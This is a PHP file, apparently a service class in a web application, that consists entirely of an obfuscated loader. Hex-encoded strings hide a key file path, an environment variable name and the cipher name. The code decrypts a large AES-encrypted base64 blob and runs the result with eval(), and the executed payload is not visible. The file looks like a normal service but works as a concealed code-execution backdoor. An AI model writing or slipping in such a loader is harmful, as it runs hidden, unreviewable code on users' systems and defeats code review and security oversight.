<?php
namespace App\Services;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('qanNTGAqLu0lSnTeiBCiww==');
$c=base64_decode(
'pkZHudVZ7rp90vJxElkhrN9bRYcBXFe6Frwh/Ox++PauLUYKZLoVnKwAxktJfcdK2b6TVT5T+EdA' .
'M+blUOWAg83MrK8lnsfaFd51fpST8ZdU4Wof7SF76jRFOxmHrGqOCXWvlt1464ySFsOhayOlI6Ah' .
'ipG57S0TsuuUgS4P+Asl4zL05/cFN533r3Sdqh/YTyutvNRCvnz9sKZpQDSWxJyodHnjnm128obs' .
'DcmyT6CgYrT3fmdo+weIPlYSC1Me0bfAU1F+zyeSlw9I22ZSoiWHjfz/32GoeWGWNU3Irux8XVoA' .
'iiDtyObOKN3n3GvINt1ICZ6Hbs8o1w3F2I6svFzyhAh0tsEu3j9K1BkIHvXp5E9eaQi1Czl74+0f' .
'P+qmZxE6WBoKaRI01sX7alpK0X4VyHuAheu31DK7hDQSRxylGPHpGONdqVf2UVIFBe3TATe5/djy' .
'9qmEmx+J4mmegjg2CFWAzMrv2quKHmpP0CH2ZlcubaojWowiiUKNtXV2d3BMiA77nco30Q99k+cD' .
'BZWR62M/E14UbU9UXG+D7E/0vkex2BmevdxMPljaKBQfdJkYM0b8vAAvfO23MgPh29R1R8/wJIJW' .
'Ux72Gp6Ebi2XS50/oyfj6HruLiLcPHeMKouzNWndZkgIWXQ3SfjwVVeROh1VYFYdPBUY0MZh5Vrb' .
'dRm+eketvEGIpN+yX0JilZIiAAr55qvx69kVR21KYW+4wjvKEct4o63L83w4/BTJlytAUMXx3gKk' .
'/GnYFDESJQaM6d3/ImdnDpUluvpVv6p89OWpSHOWg1MFOioj5XUU6nziKKwmoFe9zejXHT249Eiw' .
'jqas8pcVqwqLqrnthz5kDN6DtwOZHLG7I/yhRRFQtJ6NvehqV5/qBgwAdacZIlN50Ig8zp4MGW3S' .
'TqhLCU+zcwnH0WRIEUrLYx1UyYa387hhLS7MdAI3TFXGtdqoEVWsRogmrQa40aKaUBbk7iw7PpA3' .
'RmU7fFjYt+ajWMK1BBpdipVPyc5OgTEg0kLqpY5SlXXzueYLLxwRxB040WkxPCOKVU/SoxkbL+rN' .
'hu8N9qpjwMzJ+BqDgb5b7UKS41F26OIjQ+ccLKIBWTw9uRFfRzWdCQ9707Vtwh+OYx/a/HkBroMt' .
'saAWPDZ2OwpxnKzKVJllwyaaShiPWRYYvektJpAnQP/3aWHJS/zWPBnGZRc/0poV2fGVvgg/h3Je' .
'JAc2aO1e1WBlact9dgaNRx4H8Ye4nsaLEgxIqGdBtVm/MfWaAdJd6ZcqK+zTafxXszDeFhzculfK' .
'+95bfN6CEw24W3Fp5KCfZajtkMOzFwvQFVRM2e0G4OX+Yhlyy2/9P6Godggeq4SEop/puJIXCpiJ' .
'0nokeqBTd4jn6fHGeiYMuSk4mRr4qjqqJRw1+5LTS1I1sirJlfBZZapmiAp/OrUMIoHXTotISpaQ' .
'H4fPyuVPVx6KMG7kz4XD5ehREzwx9Ntqta7e/pcdQqJ98m/QUApbZ1cp53Js14xK+qPbjWzcjR2h' .
'FbkS948io2oamsbWbLAmPfFHj120Rz9XFx43jQvlzX+gujf3fDKaEO1avkJyBM5PY/C+NtH5Lise' .
'xgZqA4SUbRUzAtcuNx7+7UxxSdlb93GsZl+q4NoqlHvOQA2apm5NHqB5K/fc8fd9QUDheY7Ls5EK' .
'AJnpAZ/6ss4xjcSS2q8jZKYW2ZUFe4RicKjL/k9nwsjvG/Z8IAxQy2Tz/YNQb2m4/FqdyYwf3gB0' .
'cLpgJzxR9CoJTd3lSK6IKT+3Almgpwt65WCfmXpAbYtrEW+zE2x6CrQ5+vW5cyfXvq1dUfMManP0' .
'cwHYxqe3/WFpMwI8Ea8gMlDjti/4Y011SOCL+1PUf7MSWal3vrPVXZHwHaJgszMMBcJGx4ELtqOP' .
'OPV6GdjdIeUIHg6tK8xHVx9KvTD3Yjjtz/TVZbY+F7fd5a52q+bC073Gz8jlkvs26PIJbKhcy2J1' .
'nZz5A/+OFHX7hybnCi4TeQiDuYmqy0Lj32/xhCamHNAjnY6SeJLXcuhpDCSnRe1+9V3WeVg0+zbH' .
'ZqNfbWZhnq8n7gVW1Xm+2zWD0HM/aThJ6GwElOJ8xYrQBbUIRW7lBwnNmBga8cklcRjM6nv39ZWk' .
'8/83wyhSSaJpfSuw3JK6H5TQTIG4L29Wd2V0Ve7GeoTSwKfbbjNLXZojjt0hSAxmJrpXfzx7Wxm5' .
'8RHsE63z3aUKgdiY/pHedezR6EBjzyrVjr7luUyAJkCljCFHeAItohHn+HctS7nqAGqvk0AJXYsh' .
'+XS2vwtUktEBsabo7U0731fX58QDilL7v4BaX+w03jxIuWYomGzMV8NkBkoi5VV9dhs7y8j+QBCP' .
'jjdvt0Z5F3giMX90qnWswpMWH5EhT4bRU4MT5LGkqQfNYSWHbcv5hURbmTZr8u9ZSBgvjuEZnFVz' .
'/KEEVhzYRhn2JjzNiKU2L5GVtJSpFsRZXytOiXJ1T7Nx2ifn1UP/xK9Pa8VG42hFldwReM6ZIZMM' .
'VSj0iyjenMSTYu5cloPyqreWXj8qCBn1wNwBolGPSmkGJjdDCnpuvTYHPTMOZuVQnU2rmqZW0hUi' .
'4bJhyaIQ76NhbEUxdkg9GvaxgQvVDZZtY6AI7fUIV368xTQKvKA9WPQOI3qQeEr0MuBu8M21UOF/' .
'UkA7dNME/cGQN8YGhZ+dk/F/FWQO9ULrLrAuOtHlhnvUEkurWtzee/BJWDf+395qc6mg056nKYlL' .
'RhdP2EjheyYdku4dzQI6kiuF9WXPFKMMzeobORGCkUnxwx3DdPsKQbDOApWV972uy6ZlF3zk3JSg' .
'yOABQHDTiX9FmARdDfL8l1SLAQMVGKBc2RmsC6mKkGhs723jQ9HNsJrbHhW5aFVVwljtA1O/COMs' .
'3RnEMaKkXmplzzWPtgJwgTCOBCDq2OXxiMS+6TdUbuWnIdKE1OhmijHq/+LnVKJ9RN5UysKal7lP' .
'PcfUapKLjIEXZcrgEpOkxI/2ktbwtSxSyLM33oJlX3syS9uMG2fzVSxlw/cGQ5jyz6RsSG+TCkAr' .
'atl2YnO7DOfayrPsqQkMm6zopThb/Wsyh5+3NB0bwThdYDBZ+I+R778KCn4/mTfDVsbdtWYjER3G' .
'M6PterpKLCoNyJamKYwx0LAoRIOB9HLnxrkIvP1teU9llvglbXrczr7jNNHIEuVqTH5FEn+Wse+k' .
'Sf1zenkxC5E5duieBoz29fVfcE6SRcf6j1R8LxWTetUl9M4bpW04pSXAe37n6GgNTW94CTDv0YO8' .
'jCWxI/bRLVKJ+++iiYsbSAPywrTIeyWqyulxCAujHSb5hnS46hssseRbbiIUhD5ggqN4di2NeyqO' .
'sS7mYhmBe6+NXYaCmXMiXWV5rMHpfAv9y3vIffWmRwVOyIAo1Rx/MFrFExOvIs4vkl5uHJC3eJav' .
'/A9UUU3uUICbzKE='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
